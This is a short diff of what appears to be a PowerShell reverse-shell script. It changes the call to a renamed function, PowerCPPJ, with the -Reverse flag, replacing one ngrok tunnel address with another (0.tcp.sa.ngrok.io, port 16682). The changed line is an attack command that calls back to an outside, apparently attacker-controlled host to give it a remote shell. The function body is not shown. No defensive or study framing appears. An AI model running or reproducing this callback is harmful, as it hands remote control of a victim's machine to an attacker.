@@ -90,4 +90,4 @@ function PowerCPPJ
 }
 #Init Function to reverse
 #$$$$$$$$$$$$$$$$$$$$
-PowerCPPJ -Reverse -IPAddress 423f-190-232-27-74.ngrok-free.app -Port 443
+PowerCPPJ -Reverse -IPAddress 0.tcp.sa.ngrok.io -Port 16682
